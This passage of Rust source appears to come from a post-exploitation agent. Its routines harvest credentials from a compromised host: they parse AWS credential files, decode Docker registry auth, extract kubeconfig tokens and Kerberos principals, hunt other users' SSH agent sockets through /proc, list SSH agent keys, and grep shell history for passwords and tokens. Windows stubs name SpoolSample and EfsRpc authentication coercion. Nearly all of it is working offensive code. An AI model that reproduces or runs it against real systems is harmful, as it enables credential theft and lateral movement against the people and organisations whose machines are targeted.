    if data[data.len() - pad..].iter().all(|&b| b as usize == pad) {
        Some(&data[..data.len() - pad])
    } else {
        Some(data)
    }
}

fn _asn1_length(data: &[u8]) -> Option<usize> {
    if data.len() < 2 { return None; }
    let b = data[1];
    if b < 0x80 { Some(b as usize) }
    else if b == 0x81 && data.len() >= 3 { Some(data[2] as usize) }
    else if b == 0x82 && data.len() >= 4 { Some(((data[2] as usize) << 8) | data[3] as usize) }
    else { None }
}

// ── SSH key classification ──────────────────────────────────────────────────

fn _ssh_key_encrypted(data: &[u8]) -> bool {
    let s = String::from_utf8_lossy(&data[..data.len().min(500)]);
    s.contains("ENCRYPTED") || s.contains("aes") || s.contains("DEK-Info")
}

// ── Cloud credential parsers ─────────────────────────────────────────────────

fn _parse_aws_creds(content: &str) -> String {
    let mut out = String::new();
    let mut current_profile = String::new();
    for line in content.lines() {
        let line = line.trim();
        if line.starts_with('[') && line.ends_with(']') {
            current_profile = line[1..line.len()-1].to_string();
        } else if line.starts_with("aws_access_key_id") || line.starts_with("aws_secret_access_key") || line.starts_with("aws_session_token") {
            if !current_profile.is_empty() {
                out.push_str(&format!("    [{}] {}\n", current_profile, line));
            } else {
                out.push_str(&format!("    {}\n", line));
            }
        }
    }
    out
}

#[cfg(unix)]
fn _parse_docker_config(content: &str) -> String {
    let mut out = String::new();
    if let Ok(json) = serde_json::from_str::<serde_json::Value>(content) {
        if let Some(auths) = json.get("auths").and_then(|v| v.as_object()) {
            for (registry, val) in auths {
                let auth = val.get("auth").and_then(|v| v.as_str()).unwrap_or("");
                if !auth.is_empty() {
                    let decoded = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, auth)
                        .map(|d| String::from_utf8_lossy(&d).to_string())
                        .unwrap_or_else(|_| "(base64 decode failed)".to_string());
                    out.push_str(&format!("    {} → {}\n", registry, decoded));
                }
            }
        }
    }
    out
}

#[cfg(unix)]
fn _parse_kube_config(content: &str) -> String {
    let mut out = String::new();
    if let Ok(yaml) = serde_json::from_str::<serde_json::Value>(content) {
        // kubeconfig is YAML but often valid JSON-subset; try basic extraction
        if let Some(users) = yaml.get("users").and_then(|v| v.as_array()) {
            for user in users {
                let name = user.get("name").and_then(|v| v.as_str()).unwrap_or("?");
                if let Some(u) = user.get("user").and_then(|v| v.as_object()) {
                    if let Some(token) = u.get("token").and_then(|v| v.as_str()) {
                        out.push_str(&format!("    {} → token: {}...\n", name, &token[..token.len().min(32)]));
                    }
                    if u.contains_key("client-certificate-data") {
                        out.push_str(&format!("    {} → client cert present\n", name));
                    }
                }
            }
        }
    }
    // Fallback: grep for token/password lines
    if out.is_empty() {
        for line in content.lines() {
            let l = line.trim();
            if l.starts_with("token:") || l.starts_with("password:") || l.starts_with("client-certificate-data:") {
                out.push_str(&format!("    {}\n", &l[..l.len().min(80)]));
            }
        }
    }
    out
}

// ── Kerberos ccache parser ──────────────────────────────────────────────────

#[cfg(unix)]
fn _parse_krb5_ccache(data: &[u8]) -> String {
    if data.len() < 8 { return String::new(); }
    let mut out = String::new();
    // File format version (first 2 bytes): 0x0504 = version 4
    let version = u16::from_be_bytes([data[0], data[1]]);
    if version != 0x0504 && version != 0x0503 { return String::new(); }
    // Skip header (version-dependent), extract principal name
    let mut pos = if version == 0x0504 {
        if data.len() < 12 { return String::new(); }
        let hdr_len = u16::from_be_bytes([data[10], data[11]]) as usize;
        12 + hdr_len
    } else { 2 };
    // Read default principal
    if pos + 4 > data.len() { return String::new(); }
    let name_type = u32::from_be_bytes([data[pos], data[pos+1], data[pos+2], data[pos+3]]);
    let _ = name_type; pos += 4;
    if pos + 4 > data.len() { return String::new(); }
    let num_components = u32::from_be_bytes([data[pos], data[pos+1], data[pos+2], data[pos+3]]) as usize;
    pos += 4;
    // Read realm
    if pos + 4 > data.len() { return String::new(); }
    let realm_len = u32::from_be_bytes([data[pos], data[pos+1], data[pos+2], data[pos+3]]) as usize;
    pos += 4;
    if pos + realm_len > data.len() { return String::new(); }
    let realm = String::from_utf8_lossy(&data[pos..pos + realm_len]).to_string();
    pos += realm_len;
    let mut components = Vec::new();
    for _ in 0..num_components {
        if pos + 4 > data.len() { break; }
        let comp_len = u32::from_be_bytes([data[pos], data[pos+1], data[pos+2], data[pos+3]]) as usize;
        pos += 4;
        if pos + comp_len > data.len() { break; }
        components.push(String::from_utf8_lossy(&data[pos..pos + comp_len]).to_string());
        pos += comp_len;
    }
    let principal = format!("{}@{}", components.join("/"), realm);
    out.push_str(&format!("    Principal: {}\n", principal));
    out
}

#[cfg(unix)]
fn _find_files_by_name(root: &str, name: &str, max_depth: usize) -> Result<Vec<String>, ()> {
    let mut results = Vec::new();
    _walk_dir_find(root, name, "", false, max_depth, 0, &mut results);
    Ok(results)
}

#[cfg(unix)]
fn _find_files_by_ext(root: &str, ext: &str, max_depth: usize) -> Result<Vec<String>, ()> {
    let mut results = Vec::new();
    _walk_dir_find(root, "", ext, false, max_depth, 0, &mut results);
    Ok(results)
}

#[cfg(unix)]
fn _find_files_containing(root: &str, needle: &str, max_depth: usize) -> Result<Vec<String>, ()> {
    let mut results = Vec::new();
    _walk_dir_find_content(root, needle, max_depth, 0, &mut results);
    Ok(results)
}

#[cfg(unix)]
fn _walk_dir_find(dir: &str, name: &str, ext: &str, _content: bool, max_depth: usize, depth: usize, out: &mut Vec<String>) {
    if depth > max_depth || out.len() >= 20 { return; }
    let entries = match std::fs::read_dir(dir) { Ok(e) => e, Err(_) => return };
    for entry in entries.flatten() {
        if out.len() >= 20 { return; }
        let ft = match entry.file_type() { Ok(t) => t, Err(_) => continue };
        let fname = entry.file_name().to_string_lossy().to_string();
        if ft.is_file() {
            if !name.is_empty() && fname == name { out.push(entry.path().to_string_lossy().to_string()); }
            if !ext.is_empty() && fname.ends_with(&format!(".{}", ext)) { out.push(entry.path().to_string_lossy().to_string()); }
        } else if ft.is_dir() && !fname.starts_with('.') {
            _walk_dir_find(&entry.path().to_string_lossy(), name, ext, _content, max_depth, depth + 1, out);
        }
    }
}

#[cfg(unix)]
fn _walk_dir_find_content(dir: &str, needle: &str, max_depth: usize, depth: usize, out: &mut Vec<String>) {
    if depth > max_depth || out.len() >= 20 { return; }
    let entries = match std::fs::read_dir(dir) { Ok(e) => e, Err(_) => return };
    for entry in entries.flatten() {
        if out.len() >= 20 { return; }
        let ft = match entry.file_type() { Ok(t) => t, Err(_) => continue };
        let fname = entry.file_name().to_string_lossy().to_string();
        if ft.is_file() {
            if let Ok(content) = std::fs::read_to_string(entry.path()) {
                if content.contains(needle) { out.push(entry.path().to_string_lossy().to_string()); }
            }
        } else if ft.is_dir() && !fname.starts_with('.') {
            _walk_dir_find_content(&entry.path().to_string_lossy(), needle, max_depth, depth + 1, out);
        }
    }
}

#[cfg(unix)]
fn _get_uid() -> u32 {
    unsafe { libc::getuid() }
}

#[cfg(windows)]
fn _coerce_spoolsample_local() -> Result<String, String> {
    // Create a named pipe and trigger MS-RPRN coercion locally
    // This is a simplified implementation — in production would use
    // proper named pipe + RPC binding to the local spooler service
    Err("SpoolSample coercion not yet implemented for Rust agent".to_string())
}

#[cfg(windows)]
fn _coerce_efsrpc_local() -> Result<String, String> {
    Err("EfsRpc coercion not yet implemented for Rust agent".to_string())
}

// ── Linux SSH Agent helpers ──────────────────────────────────────────────────

#[cfg(unix)]
struct SshAgentInfo {
    user: String,
    pid:  u32,
    sock: String,
}

#[cfg(unix)]
struct SshKeyInfo {
    key_type: String,
    comment:  String,
}

#[cfg(unix)]
fn _find_ssh_agents() -> Vec<SshAgentInfo> {
    let mut agents = Vec::new();

    // Scan /proc for SSH_AUTH_SOCK in environ
    let proc_dir = match std::fs::read_dir("/proc") {
        Ok(d) => d,
        Err(_) => return agents,
    };

    let mut seen_socks = std::collections::HashSet::new();

    for entry in proc_dir.flatten() {
        let name = entry.file_name().to_string_lossy().to_string();
        if !name.chars().all(|c| c.is_ascii_digit()) { continue; }

        let pid: u32 = match name.parse() {
            Ok(p) => p,
            Err(_) => continue,
        };

        let environ_path = format!("/proc/{}/environ", pid);
        let environ = match std::fs::read(&environ_path) {
            Ok(d) => d,
            Err(_) => continue,
        };

        // Parse null-separated environment variables
        for var in environ.split(|&b| b == 0) {
            let var_str = String::from_utf8_lossy(var);
            if let Some(sock) = var_str.strip_prefix("SSH_AUTH_SOCK=") {
                if seen_socks.contains(sock) { continue; }
                if !std::path::Path::new(sock).exists() { continue; }

                // Get user from /proc/pid/status
                let status_path = format!("/proc/{}/status", pid);
                let user = std::fs::read_to_string(&status_path)
                    .ok()
                    .and_then(|s| {
                        s.lines()
                            .find(|l| l.starts_with("Uid:"))
                            .and_then(|l| l.split_whitespace().nth(1))
                            .and_then(|uid_str| uid_str.parse::<u32>().ok())
                            .map(|uid| _uid_to_username(uid))
                    })
                    .unwrap_or_else(|| "?".to_string());

                seen_socks.insert(sock.to_string());
                agents.push(SshAgentInfo {
                    user,
                    pid,
                    sock: sock.to_string(),
                });
            }
        }
    }

    agents
}

#[cfg(unix)]
fn _uid_to_username(uid: u32) -> String {
    // Read /etc/passwd for uid → username mapping
    if let Ok(passwd) = std::fs::read_to_string("/etc/passwd") {
        for line in passwd.lines() {
            let parts: Vec<&str> = line.split(':').collect();
            if parts.len() >= 3 {
                if let Ok(file_uid) = parts[2].parse::<u32>() {
                    if file_uid == uid {
                        return parts[0].to_string();
                    }
                }
            }
        }
    }
    format!("uid:{}", uid)
}

#[cfg(unix)]
fn _ssh_agent_list_keys(sock_path: &str) -> Result<Vec<SshKeyInfo>, String> {
    use std::io::{Read, Write};
    use std::os::unix::net::UnixStream;

    let mut stream = UnixStream::connect(sock_path)
        .map_err(|e| format!("connect: {}", e))?;
    stream.set_read_timeout(Some(std::time::Duration::from_secs(5))).ok();

    // SSH_AGENTC_REQUEST_IDENTITIES = 11
    let request: [u8; 5] = [0, 0, 0, 1, 11];
    stream.write_all(&request).map_err(|e| format!("write: {}", e))?;

    // Read response length (4 bytes)
    let mut len_buf = [0u8; 4];
    stream.read_exact(&mut len_buf).map_err(|e| format!("read len: {}", e))?;
    let resp_len = u32::from_be_bytes(len_buf) as usize;
    if resp_len > 1024 * 1024 { return Err("response too large".to_string()); }

    let mut resp = vec![0u8; resp_len];
    stream.read_exact(&mut resp).map_err(|e| format!("read body: {}", e))?;

    // Response: type (1 byte) = SSH_AGENT_IDENTITIES_ANSWER (12)
    if resp.is_empty() || resp[0] != 12 {
        return Err("unexpected response type".to_string());
    }

    // Number of keys (4 bytes)
    if resp.len() < 5 { return Err("short response".to_string()); }
    let nkeys = u32::from_be_bytes([resp[1], resp[2], resp[3], resp[4]]) as usize;

    let mut keys = Vec::new();
    let mut offset = 5;

    for _ in 0..nkeys {
        if offset + 4 > resp.len() { break; }
        let blob_len = u32::from_be_bytes([resp[offset], resp[offset+1], resp[offset+2], resp[offset+3]]) as usize;
        offset += 4;
        if offset + blob_len > resp.len() { break; }

        // Extract key type from the blob
        let key_type = if blob_len >= 4 {
            let kt_len = u32::from_be_bytes([resp[offset], resp[offset+1], resp[offset+2], resp[offset+3]]) as usize;
            if kt_len + 4 <= blob_len {
                String::from_utf8_lossy(&resp[offset+4..offset+4+kt_len]).to_string()
            } else {
                "unknown".to_string()
            }
        } else {
            "unknown".to_string()
        };

        offset += blob_len;

        // Comment string
        if offset + 4 > resp.len() { break; }
        let comment_len = u32::from_be_bytes([resp[offset], resp[offset+1], resp[offset+2], resp[offset+3]]) as usize;
        offset += 4;
        let comment = if offset + comment_len <= resp.len() {
            String::from_utf8_lossy(&resp[offset..offset+comment_len]).to_string()
        } else {
            String::new()
        };
        offset += comment_len;

        keys.push(SshKeyInfo { key_type, comment });
    }

    Ok(keys)
}

#[cfg(unix)]
fn _grep_history_secrets(home: &str) -> String {
    let hist_files = [
        format!("{}/.bash_history", home),
        format!("{}/.zsh_history", home),
    ];
    let patterns = ["password", "token", "secret", "api_key", "apikey",
                    "AWS_ACCESS", "AWS_SECRET", "PRIVATE_KEY", "Bearer"];

    let mut matches = Vec::new();
    for hf in &hist_files {
        if let Ok(content) = std::fs::read_to_string(hf) {
            for line in content.lines() {
                let lower = line.to_lowercase();
                if patterns.iter().any(|p| lower.contains(&p.to_lowercase())) {
                    if matches.len() < 50 {
                        matches.push(line.to_string());
                    }
                }
            }
        }
    }
    matches.join("\n")
}
